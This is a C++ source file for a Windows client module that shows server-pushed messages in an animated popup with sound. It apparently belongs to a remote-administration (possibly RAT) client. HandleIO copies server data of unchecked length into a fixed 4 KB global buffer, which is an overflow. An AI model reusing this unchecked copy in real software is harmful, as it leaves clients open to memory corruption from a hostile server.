#include "ClientInstantManager.h"
#include "Common.h"
#include "resource.h"
#include <mmsystem.h>

#pragma comment(lib, "WINMM.LIB")
CHAR   __BufferData[0x1000] = { 0 };  //
_CIOCPClient* __ClientObject = NULL;
extern HINSTANCE __InstanceHandle;

#define WIN_WIDTH		220   
#define WIN_HEIGHT		150
#define ID_TIMER_POP_WINDOW		1
#define ID_TIMER_DELAY_DISPLAY	2 
#define ID_TIMER_CLOSE_WINDOW	3 

int    __TimeEvent = 0;


CClientInstantManager::CClientInstantManager(_CIOCPClient* ClientObject):CManager(ClientObject)
{

	BYTE	IsToken = CLIENT_INSTANT_MESSAGE_REPLY; //反馈 回传数据包到服务器
	m_ClientObject->OnServerSending((char*)&IsToken, 1);

	__ClientObject = m_ClientObject;  //一个全局

	WaitForServerDialogOpen();   //该函数是父类 等待 服务端的对话框打开
}

CClientInstantManager::~CClientInstantManager()
{

}

void CClientInstantManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}

	default:
	{
		//获得远程消息的数据内容
		memcpy(__BufferData, BufferData, BufferLength);
		//创建一个DLG 
		DialogBoxA(__InstanceHandle, MAKEINTRESOURCE(IDD_DIALOG_INSTANT_MESSAGE_MAIN),
			NULL, DialogProcedure);  //SDK   C   MFC  C++
		break;
	}
	}
}


//窗口回调
int CALLBACK DialogProcedure(HWND DlgHwnd, unsigned int Msg,
	WPARAM wParam, LPARAM lParam)
{

	switch (Msg)
	{
	case WM_INITDIALOG:
	{
		OnInitDialog(DlgHwnd);
		break;
	}
	case WM_TIMER:
	{
		OnTimerDialog(DlgHwnd);
		break;
	}

	}

	return 0;
}

VOID OnInitDialog(HWND DlgHwnd)
{
	MoveWindow(DlgHwnd, 0, 0, 0, 0, TRUE);
	//在控件上设置数据
	SetDlgItemText(DlgHwnd, IDC_EDIT_INSTANT_MESSAGE_MAIN, __BufferData);

	memset(__BufferData, 0, sizeof(__BufferData));


	__TimeEvent = ID_TIMER_POP_WINDOW;

	SetTimer(DlgHwnd, __TimeEvent, 1, NULL);  //时钟回调   关联事件 每隔一秒钟触发

	PlaySound(MAKEINTRESOURCE(IDR_WAVE_INSTANT_MESSAGE),
		__InstanceHandle, SND_ASYNC | SND_RESOURCE | SND_NODEFAULT);
}


VOID OnTimerDialog(HWND DlgHwnd)   //时钟回调
{
	RECT  Rect;
	static int Height = 0;
	SystemParametersInfo(SPI_GETWORKAREA, 0, &Rect, 0); 
	int y = Rect.bottom - Rect.top;
	//int x = Rect.right - Rect.left ;
	//x = x - WIN_WIDTH;

	int x = 0;
	switch (__TimeEvent)
	{
	case ID_TIMER_CLOSE_WINDOW:
	{
		if (Height >= 0)
		{
			Height -= 5;
			MoveWindow(DlgHwnd, x, y - Height, WIN_WIDTH, Height, TRUE);
		}
		else
		{
			KillTimer(DlgHwnd, ID_TIMER_CLOSE_WINDOW);
			//通知服务器可以继续发送新的数据
			BYTE IsToken = CLIENT_INSTANT_MESSAGE_COMPLETE;				// 包含头文件 Common.h     
			__ClientObject->OnServerSending((char*)&IsToken, 1);		// 发送允许重新发送的指令
			EndDialog(DlgHwnd, 0);
		}
		break;
	}

	case ID_TIMER_DELAY_DISPLAY:
	{
		KillTimer(DlgHwnd, ID_TIMER_DELAY_DISPLAY);
		__TimeEvent = ID_TIMER_CLOSE_WINDOW;
		SetTimer(DlgHwnd, __TimeEvent, 5, NULL);
		break;
	}
	case ID_TIMER_POP_WINDOW:
	{
		if (Height <= WIN_HEIGHT)
		{
			Height += 3;
			MoveWindow(DlgHwnd, x, y - Height, WIN_WIDTH, Height, TRUE);
		}
		else
		{
			KillTimer(DlgHwnd, ID_TIMER_POP_WINDOW);
			__TimeEvent = ID_TIMER_DELAY_DISPLAY;
			SetTimer(DlgHwnd, __TimeEvent, 7000, NULL); //过七秒钟
		}
		break;
	}
	}
}

